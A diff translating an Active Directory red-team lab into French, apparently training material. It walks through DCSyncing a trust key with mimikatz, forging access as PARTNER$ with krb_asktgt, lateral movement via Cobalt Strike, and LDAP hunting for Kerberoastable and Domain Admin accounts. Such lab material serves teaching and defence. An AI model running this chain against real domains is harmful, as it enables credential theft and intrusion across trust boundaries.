@@ -1,12 +1,12 @@
-# Outbound Trusts Lab
+# Lab — Outbound Trusts
 
-> The objective for this lab is to perform enumeration across a one-way outbound trust by abusing the inter-realm trust key stored in the Trusted Domain Object (TDO).
+> L’objectif est d’effectuer une **énumération entre deux domaines** liés par une Outbound Trust à sens unique, à partir de la clé inter-realm stockée dans le Trusted Domain Object (TDO).
 
 ===
 
-## Trust Relationship  
+## Relation de Trust  
 
-This lab is the **opposite direction** to the Inbound Trusts lab  
+Ce lab explore la **direction inverse** de celui consacré aux Inbound Trusts.  
 
 ```
 ┌─────────────────────────────────────┐        ┌─────────────────────────────────────┐
@@ -26,33 +26,33 @@ This lab is the **opposite direction** to the Inbound Trusts lab
    (resources are here — our beacon)                 (accounts originate here)
 ```
 
-**The normal flow** (legitimate):  
-> CONTOSO users authenticate to PARTNER's DC → present credentials → access PARTNER resources. PARTNER users get nothing on CONTOSO (one-way).  
+**Flux normal (légitime) :**  
+> Les utilisateurs CONTOSO s’authentifient auprès du DC PARTNER et accèdent aux ressources PARTNER. L’inverse n’est pas autorisé par cette Trust à sens unique.  
 
-**The attack**:  
-> We are on PARTNER (the trusting domain). We should have no access to CONTOSO (the trusted domain).  
-> BUT — the inter-realm trust key is stored on BOTH sides.  
-> We can DCSync PARTNER's TDO to get that shared key, then use it to authenticate to CONTOSO's KDC as the trust account.  
-> This gets us an authenticated foothold in CONTOSO for enumeration.  
-
----
-
-## What Is a Trusted Domain Object (TDO)?
-
-When a trust is created, each domain stores a `trustedDomain` object in its `CN=System` partition. This object holds:
-- The FQDN and SID of the partner domain
-- Trust direction and attributes
-- The **inter-realm trust key** — a shared secret (password hash) that both KDCs use to sign cross-realm tickets
-
-The trust key is what makes this attack possible. It is stored in the TDO like a machine account password. DCSync can replicate it just like any other secret — but you must reference the TDO by **object GUID** because it is not a user account.
+**Scénario d’attaque :**  
+> Le point de départ est PARTNER (domaine faisant confiance). Normalement, aucun accès à CONTOSO (domaine approuvé) n’est accordé.  
+> La clé inter-realm est toutefois stockée **des deux côtés**.  
+> Le scénario utilise DCSync sur le TDO de PARTNER pour récupérer cette clé partagée, puis s’authentifier au KDC de CONTOSO sous le compte de Trust.  
+> Cela permet d’obtenir un contexte authentifié dans CONTOSO pour l’énumération.  
 
 ---
 
-## Trust Account — PARTNER$ in CONTOSO
+## Qu’est-ce qu’un Trusted Domain Object (TDO) ?
 
-When PARTNER established this trust, CONTOSO automatically created an account named **`PARTNER$`** in its own directory. This account's password is the inter-realm trust key (the same secret stored in PARTNER's TDO). It functions like a machine account — it represents the PARTNER domain boundary to CONTOSO's KDC.
+Lors de la création d’une Trust, chaque domaine conserve un objet `trustedDomain` dans `CN=System`. Cet objet contient :
+- Le FQDN et le SID du domaine partenaire.
+- La direction de la Trust et ses attributs.
+- La **clé inter-realm**, secret partagé (hash de mot de passe) utilisé par les KDC pour les tickets cross-realm.
 
-When CONTOSO's KDC receives a cross-realm ticket from PARTNER users, it validates the ticket using PARTNER$'s key. By obtaining that key, we can authenticate as PARTNER$ directly to CONTOSO's KDC and receive a legitimate TGT — one that gives us authenticated read access to CONTOSO's directory.
+La clé de Trust est stockée dans le TDO comme le secret d’un compte machine. Dans le scénario, DCSync peut la répliquer, mais le TDO doit être ciblé par son **objectGUID**, car il ne s’agit pas d’un compte utilisateur.
+
+---
+
+## Trust Account — PARTNER$ dans CONTOSO
+
+Lors de l’établissement de la Trust, CONTOSO a créé dans son annuaire un compte **`PARTNER$`**. Son secret correspond à la clé inter-realm présente dans le TDO de PARTNER. Ce compte représente le domaine PARTNER auprès du KDC de CONTOSO.
+
+Le KDC de CONTOSO utilise la clé de `PARTNER$` pour valider les tickets cross-realm venant de PARTNER. Le lab montre qu’une clé récupérée peut permettre une authentification `PARTNER$` et l’obtention d’un TGT donnant un accès de lecture authentifié à l’annuaire CONTOSO.
 
 ```
 What we have:            What we want:
@@ -64,41 +64,41 @@ TDO inter-realm key (DCSync from PARTNER) → authenticate as PARTNER$ to CONTOS
 → TGT for PARTNER$@CONTOSO → LDAP queries against CONTOSO
 ```
 
-## Attack Flow Overview
+## Déroulement du lab
 
-1. Launch Cobalt Strike and connect to the team server.
-2. Interact with Beacon and enumerate the trust.
+1. Lancer Cobalt Strike et se connecter au team server.
+2. Interagir avec le Beacon et énumérer la Trust.
 
     ```Beacon-nocolor
     ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
     ```
 
-    > Queries PARTNER's domain for all `trustedDomain` objects. Each trust is represented as one of these objects in `CN=System,DC=partner,DC=com`. The attributes tell us:
-    > - `trustPartner` — FQDN of the other domain (will show `contoso.com`)
-    > - `trustDirection` — direction integer from OUR (PARTNER) perspective
-    > - `trustAttributes` — flags (8 = forest trust with SID filtering)
-    > - `flatName` — NetBIOS name of the partner (e.g. `CONTOSO`)
+    > Interroge le domaine PARTNER pour récupérer les objets `trustedDomain` dans `CN=System,DC=partner,DC=com`. Les attributs indiquent :
+    > - `trustPartner` — FQDN du domaine partenaire (ici `contoso.com`).
+    > - `trustDirection` — Direction de la Trust du point de vue de PARTNER.
+    > - `trustAttributes` — Flags (8 = forest trust avec SID filtering).
+    > - `flatName` — Nom NetBIOS du partenaire (par exemple `CONTOSO`).
 
-⚠️ What do these results mean?
+⚠️ Comment interpréter les résultats ?
     >
-    > - `trustDirection 2` = **TRUST_DIRECTION_OUTBOUND** — PARTNER trusts CONTOSO. The trust arrow points away from us. CONTOSO users can access PARTNER resources. We (PARTNER users) cannot normally access CONTOSO.
-    > - `trustAttributes 8` = **TRUST_ATTRIBUTE_FOREST_TRANSITIVE** — forest-level trust. SID filtering is enforced at the boundary — SID history injection is blocked. We cannot forge arbitrary SIDs into Kerberos tickets crossing the boundary (unlike within the same forest).
+    > - `trustDirection 2` = **TRUST_DIRECTION_OUTBOUND** — PARTNER fait confiance à CONTOSO. Les utilisateurs CONTOSO peuvent accéder aux ressources PARTNER, mais pas l’inverse.
+    > - `trustAttributes 8` = **TRUST_ATTRIBUTE_FOREST_TRANSITIVE** — Forest Trust avec SID filtering à la frontière. Le scénario ne permet pas d’injecter librement des SID History dans les tickets qui traversent cette frontière.
 
-3. Get the GUID of the TDO.
+3. Récupérer le GUID du TDO.
 
     ```Beacon-nocolor
     ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
     ```
 
-    > **Why we need the GUID:** DCSync normally replicates user or computer account objects identified by their `sAMAccountName`.  
-    The TDO is a `trustedDomain` object stored in `CN=System`.  
-    To replicate it with DCSync (mimikatz `lsadump::dcsync`), you must identify the object by its `objectGUID` using the `/guid:` flag.
+    > **Pourquoi le GUID ?** DCSync réplique habituellement des objets de comptes utilisateurs ou machines identifiés par `sAMAccountName`.  
+    Le TDO est un objet `trustedDomain` stocké dans `CN=System`.  
+    Pour le cibler avec DCSync (Mimikatz `lsadump::dcsync`), il faut utiliser son `objectGUID` avec l’option `/guid:`.
     >
-    > The GUID returned `{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}` is PARTNER's TDO object for the CONTOSO trust. Note it — this is `[TDO_GUID]` used in step 5.
+    > Le GUID `{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}` correspond au TDO de PARTNER pour CONTOSO. Il constitue la variable `[TDO_GUID]` utilisée à l’étape 5.
 
-4. Inject a Beacon payload into a *vwebber* process.
+4. Injecter un payload Beacon dans le processus `vwebber`.
 
->DCSync requires the replication privileges `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`.  
+> DCSync nécessite les permissions de réplication `DS-Replication-Get-Changes` et `DS-Replication-Get-Changes-All`.  
 
 ```
 process_browser
@@ -106,127 +106,127 @@ steal_token <pid vwebber>
 ```
 
 > **OPSEC-🟠CAUTION** 
- Process injection generates telemetry. Prefer `steal_token <pid>` (no new thread injection) over `inject` if the goal is just token impersonation for the DCSync call.
+ L’injection de processus produit de la télémétrie. Les notes privilégient `steal_token <pid>` lorsqu’une simple Token Impersonation suffit pour DCSync.
 
-> ⚠️ **Lateral move to par-dc-1 — `jump scshell64` will fail if `defragsvc` is already running (confirmed 2026-04-29):**
+> ⚠️ **Lateral Movement vers par-dc-1 — `jump scshell64` échoue si `defragsvc` est déjà actif (observé le 29/04/2026) :**
 
->Jump to Parner Domain Controller:  
+> Jump vers le Domain Controller PARTNER :  
 
 ```
 jump winrm64 par-dc-1 smb
 ```  
 
-5. Use the new Beacon to DCSync the shared inter-realm key from the TDO.
+5. Utiliser le nouveau Beacon pour récupérer la clé inter-realm partagée du TDO avec DCSync.
 
 ```Beacon-nocolor
 mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
 ```
 
 
-OPSEC-🔴UNSAFE (required for CS-only path — no alternative within beacon)
-Performs a DCSync replication request against PARTNER's DC (`/domain:partner.com` targets PARTNER's DC — this is OUR domain). The `/guid:` flag tells mimikatz to replicate the specific TDO object rather than a user account.
+OPSEC-🔴UNSAFE (chemin Cobalt Strike uniquement, sans alternative dans le Beacon selon les notes)
+Effectue une requête DCSync vers le DC de PARTNER (`/domain:partner.com`). L’option `/guid:` demande à Mimikatz de répliquer l’objet TDO précis plutôt qu’un compte utilisateur.
     >
-    > The TDO object stores the trust password in the same way a machine account stores its password. Mimikatz extracts:
-    > - `rc4_hmac_nt` — the RC4 (NT hash) of the trust key → this is `[TRUST KEY]` used in step 6
-    > - `aes256_hmac` — AES256 version of the trust key (prefer this if the command supports it)
+    > Le TDO stocke le secret de Trust comme un compte machine stocke son mot de passe. Mimikatz extrait :
+    > - `rc4_hmac_nt` — Hash RC4/NT de la clé de Trust, noté `[TRUST KEY]` à l’étape 6.
+    > - `aes256_hmac` — Version AES256 de cette clé, à privilégier lorsque la commande l’accepte.
     >
-    > Note the `rc4_hmac_nt` value from the output.
+    > Relever la valeur `rc4_hmac_nt` dans la sortie.
     >
-    > **OPSEC-🔴UNSAFE** — DCSync generates **Event 4662** on PARTNER's DC. Running DCSync against the TDO (rather than a user account) is unusual and may stand out in logs compared to a normal user account DCSync. Use AES256 if available.
+    > **OPSEC-🔴UNSAFE** — DCSync peut générer l’**Event 4662** sur le DC de PARTNER. Une réplication du TDO plutôt que d’un compte peut être inhabituelle dans les logs. Utiliser AES256 lorsqu’il est disponible, selon les notes.
     >
-    > ⚠️ **`[Out]` vs `[Out-1]` — ALWAYS use `[Out]` (confirmed 2026-04-29):** The TDO output shows two entries — `[Out]` (current key) and `[Out-1]` (previous rotation key).  
-Using `[Out-1]` rc4 hash causes `krb_asktgt` to fail with **Kerberos error 24** (`KDC_ERR_PREAUTH_FAILED`).  
-Always grab hashes from the `[Out]` block only. Prefer `aes256_hmac` over `rc4_hmac_nt`.  
+    > ⚠️ **`[Out]` et `[Out-1]` — utiliser `[Out]` (observé le 29/04/2026) :** le TDO présente `[Out]` (clé courante) et `[Out-1]` (clé précédente).  
+L’utilisation du hash RC4 de `[Out-1]` peut faire échouer `krb_asktgt` avec **Kerberos error 24** (`KDC_ERR_PREAUTH_FAILED`).  
+Dans ce lab, prendre la clé du bloc `[Out]` et privilégier `aes256_hmac` à `rc4_hmac_nt`.  
 
-6. Request a TGT for the trust account using the shared secret.  
+6. Demander un TGT du compte de Trust à l’aide du secret partagé.  
 
 ```Beacon-nocolor
 krb_asktgt /user:PARTNER$ /aes256:[TRUST KEY AES256 from [Out]] /domain:contoso.com /dc:lon-dc-1.contoso.com
 krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com
 ```
 
-    > **What this does:** Sends an AS-REQ (Kerberos authentication request) to **CONTOSO's KDC** (`/dc:lon-dc-1.contoso.com` — note this is the FOREIGN domain's DC, not ours) requesting a TGT for the account `PARTNER$` in `contoso.com`.
+    > **Fonctionnement :** une requête AS-REQ est envoyée au **KDC de CONTOSO** (`/dc:lon-dc-1.contoso.com`, DC du domaine distant) afin d’obtenir un TGT pour `PARTNER$`.
     >
-    > **Why `PARTNER$` in `contoso.com`?** When PARTNER established the outbound trust to CONTOSO, CONTOSO automatically created a trust account called `PARTNER$` in its own `CN=Users,DC=contoso,DC=com`. This account's password is the inter-realm trust key — the same RC4 hash we just DCSync'd from PARTNER's TDO. Both sides share the secret.
+    > **Pourquoi `PARTNER$` dans `contoso.com` ?** CONTOSO a créé ce compte de Trust dans `CN=Users,DC=contoso,DC=com`. Son secret est la clé inter-realm partagée avec le TDO de PARTNER.
     >
-    > CONTOSO's KDC receives our AS-REQ, validates the RC4 pre-auth against `PARTNER$`'s stored key, and issues a TGT for `PARTNER$@CONTOSO.COM`.
+    > Le KDC de CONTOSO valide l’AS-REQ avec la clé de `PARTNER$` et émet un TGT pour `PARTNER$@CONTOSO.COM`.
     >
-    > **Ticket in hand:** `TGT_PARTNER$` — a valid Kerberos TGT, issued by CONTOSO's KDC, for the `PARTNER$` account. This is an authenticated identity inside CONTOSO's Kerberos realm. `PARTNER$` is treated as a low-privilege domain account in CONTOSO — enough for LDAP enumeration.
+    > **Ticket obtenu :** `TGT_PARTNER$` est un TGT Kerberos émis par CONTOSO. Dans le lab, il fournit une identité authentifiée avec des droits suffisants pour l’énumération LDAP.
     >
-    > **OPSEC-🟠CAUTION** — Generates **Event 4768** (AS-REQ) on CONTOSO's DC (`lon-dc-1`). The account name `PARTNER$` authenticating via RC4 from an unexpected source IP may flag in MDI or SIEM. CONTOSO's defenders would see an authentication from a non-DC machine for the trust account.
+    > **OPSEC-🟠CAUTION** — Peut générer l’**Event 4768** (AS-REQ) sur `lon-dc-1`. Une authentification RC4 de `PARTNER$` depuis une IP inattendue peut être signalée par MDI ou un SIEM.
 
-7. Inject the TGT into a sacrificial logon session.
+7. Injecter le TGT dans une session de logon temporaire.
 
-    > **Why a sacrificial session?** Injecting a ticket into your current beacon logon session would overwrite or conflict with your existing Kerberos state. A sacrificial session is a fresh, isolated logon session (created via `make_token` with dummy credentials, then ticket injection) that you can discard cleanly. All subsequent Kerberos activity using CONTOSO's TGT runs in this isolated session — your primary beacon session is unaffected.
+    > **Pourquoi une session temporaire ?** Injecter un ticket dans la session courante peut provoquer un conflit Kerberos. Une session isolée créée avec `make_token` et des credentials fictifs permet d’utiliser le TGT CONTOSO sans modifier la session principale du Beacon.
 
-    **Step 7a — Create a sacrificial logon session:**
+    **Étape 7a — Créer une session de logon temporaire :**
 
 ```Beacon-nocolor
 make_token CONTOSO\PARTNER$ FakePassword
 ```
 
-    > Creates a new Type 9 logon session. The password is never validated over the network — it is a placeholder. The session exists purely to hold the injected ticket.
+    > Crée une session de logon de type 9. Le mot de passe est un placeholder non validé sur le réseau ; la session accueille le ticket injecté.
 
-    **Step 7b — Decode base64 ticket to .kirbi on attacker desktop:**
+    **Étape 7b — Convertir le ticket Base64 en `.kirbi` sur l’Attacker Desktop :**
 
-    > **IMPORTANT:** `kerberos_ticket_use` expects a **file path to a `.kirbi` file** on the CS client (attacker desktop) — NOT a raw base64 string. Passing base64 directly causes the error: `'C:\Tools\cobaltstrike\client\doIFZD...' does not exist`.  
+    > **Important :** `kerberos_ticket_use` attend le **chemin d’un fichier `.kirbi`** sur le client Cobalt Strike, pas la chaîne Base64 brute. Sinon, l’erreur `'C:\Tools\cobaltstrike\client\doIFZD...' does not exist` peut apparaître.  
 
 
->On attacker desktop PowerShell — decode base64 to .kirbi file:  
+> Sur l’Attacker Desktop, convertir le Base64 en fichier `.kirbi` avec PowerShell :  
 
 ```powershell
 [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\partner.kirbi", [Convert]::FromBase64String("[BASE64_TGT]"))
 ```
 
-    Then inject via CS native command:
+    Puis injecter le ticket avec la commande native Cobalt Strike :
 
     ```Beacon-nocolor
     kerberos_ticket_use C:\Users\Attacker\Desktop\partner.kirbi
     ```
 
-    > **OPSEC-🟢SAFE** — CS injects the ticket into the logon session via Windows Kerberos API. No process spawn, no CLR load, no disk write on the target. The `.kirbi` file lives only on the attacker desktop (CS client), never on the target machine.
+    > **OPSEC-🟢SAFE** — Injection via l’API Windows Kerberos, sans nouveau processus ni écriture disque sur la cible. Le `.kirbi` reste sur l’Attacker Desktop.
 
-8. Enumerate the trusted domain.
+8. Énumérer le domaine approuvé.
 
     ```Beacon-nocolor
     ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
     ```
 
-    > **What this does:** Queries CONTOSO's LDAP using the injected `PARTNER$` TGT (our sacrificial session now authenticates as PARTNER$@CONTOSO). The `--hostname contoso.com` and `--dn DC=contoso,DC=com` explicitly target CONTOSO's directory — the foreign domain.
+    > **Fonctionnement :** interroge LDAP sur CONTOSO avec le TGT `PARTNER$` injecté. `--hostname contoso.com` et `--dn DC=contoso,DC=com` ciblent explicitement l’annuaire du domaine distant.
     >
-    > `PARTNER$` has standard authenticated-user read access to CONTOSO's directory, which is sufficient for:
-    > - Reading all user, group, and computer objects
+    > `PARTNER$` dispose des permissions de lecture d’un utilisateur authentifié dans CONTOSO, notamment pour :
+    > - Lire les objets utilisateurs, groupes et ordinateurs.
 
-## Post-Enumeration — What to Do With CONTOSO Access
+## Post-Enumeration — Exploiter les résultats CONTOSO
 
-Once you have a TGT for `PARTNER$@CONTOSO.COM` and can query CONTOSO's LDAP, pivot using these queries:
+Après l’obtention du TGT `PARTNER$@CONTOSO.COM`, les requêtes LDAP suivantes permettent de poursuivre l’énumération :
 
-### Find Kerberoastable accounts in CONTOSO
+### Identifier les comptes Kerberoastable dans CONTOSO
 
 ```Beacon-nocolor
 ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))) --hostname contoso.com --dn DC=contoso,DC=com --attributes samAccountName,servicePrincipalName
 ```
 
-> Any account with an SPN set can be Kerberoasted. Request a service ticket for their SPN — the ticket is encrypted with the account's hash and can be cracked offline. Run `krb_asktgs /service:<SPN> /ticket:[PARTNER$_TGT]` in the sacrificial session.
+> Les comptes avec un SPN peuvent être examinés pour Kerberoasting. Un service ticket chiffré avec le secret du compte peut être analysé hors ligne. Le lab utilise `krb_asktgs /service:<SPN> /ticket:[PARTNER$_TGT]` depuis la session temporaire.
 
-### Find AS-REP Roastable accounts in CONTOSO
+### Identifier les comptes AS-REP Roastable dans CONTOSO
 
 ```Beacon-nocolor
 ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --hostname contoso.com --dn DC=contoso,DC=com --attributes samAccountName
 ```
 
-> `userAccountControl` flag `4194304` = `DONT_REQUIRE_PREAUTH`. These accounts return an AS-REP without needing pre-authentication — hash crackable offline without any credentials.
+> Le flag `userAccountControl` `4194304` correspond à `DONT_REQUIRE_PREAUTH`. Ces comptes peuvent renvoyer une réponse AS-REP sans pré-authentification, exploitable pour une analyse hors ligne.
 
-### Find DA accounts in CONTOSO
+### Identifier les comptes Domain Admin dans CONTOSO
 
 ```Beacon-nocolor
 ldapsearch (memberOf=CN=Domain Admins,CN=Users,DC=contoso,DC=com) --hostname contoso.com --dn DC=contoso,DC=com --attributes samAccountName,userAccountControl
 ```
 
-### Find further trusts FROM CONTOSO
+### Identifier d’autres Trusts depuis CONTOSO
 
 ```Beacon-nocolor
 ldapsearch (objectClass=trustedDomain) --hostname contoso.com --dn DC=contoso,DC=com --attributes trustDirection,trustPartner,trustAttributes
 ```
 
-> CONTOSO may have its own trusts to additional domains — this extends your enumeration further. A trust chain (PARTNER → CONTOSO → THIRD_DOMAIN) could be exploited step by step.
+> CONTOSO peut posséder des Trusts vers d’autres domaines, ce qui élargit le périmètre d’énumération. Le scénario envisage une chaîne PARTNER → CONTOSO → THIRD_DOMAIN.
